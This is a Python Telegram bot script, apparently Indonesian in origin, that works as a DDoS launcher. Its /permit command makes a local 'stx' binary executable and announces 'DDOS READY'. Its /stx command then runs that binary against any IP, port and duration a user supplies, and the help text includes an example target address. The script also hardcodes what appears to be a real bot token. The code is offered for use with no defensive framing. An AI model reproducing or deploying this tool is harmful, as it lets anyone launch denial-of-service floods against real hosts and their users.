import subprocess
import asyncio
import nest_asyncio
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

# Token bot
TOKEN = "7932562452:AAHllBiuVC_bT_wpbHHoHn-VuTiJOLL1bCg"

# /start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = (
        "*STX Bot by @Kecee_Pyrite*\n\n"
        "Available commands:\n"
        "/permit — Kirimkan command ini sebelum menggunakan bot\n"
        "/stx `<ip> <port> <durasi>`\n\n"
        "*Example:*\n"
        "/stx `158.10.108.179 5506 120`"
    )
    await update.message.reply_text(help_text, parse_mode=ParseMode.MARKDOWN)

# /permit command
async def permit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        subprocess.run(["chmod", "+x", "stx"], check=True)
        await update.message.reply_text("DDOS READY ! SILAHKAN GUNAKAN /stx", parse_mode=ParseMode.MARKDOWN)
    except subprocess.CalledProcessError as e:
        await update.message.reply_text(f"Error:\n`{e}`", parse_mode=ParseMode.MARKDOWN)

# /stx command
async def stx(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if len(args) != 3:
        await update.message.reply_text("Usage: /stx `<ip> <port> <durasi>`", parse_mode=ParseMode.MARKDOWN)
        return

    ip, port, durasi = args
    cmd = ["./stx", ip, port, durasi, "200", "stx"]

    try:
        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        if result.returncode == 0:
            output = result.stdout or "No output."
            await update.message.reply_text(f"Executed successfully:\n`{output}`", parse_mode=ParseMode.MARKDOWN)
        else:
            await update.message.reply_text(f"Execution failed:\n`{result.stderr}`", parse_mode=ParseMode.MARKDOWN)
    except Exception as e:
        await update.message.reply_text(f"Exception:\n`{e}`", parse_mode=ParseMode.MARKDOWN)

# Main function
async def main():
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("permit", permit))
    app.add_handler(CommandHandler("stx", stx))
    print("Bot is running...")
    await app.run_polling()

# Entry point
if __name__ == "__main__":
    nest_asyncio.apply()
    asyncio.run(main())
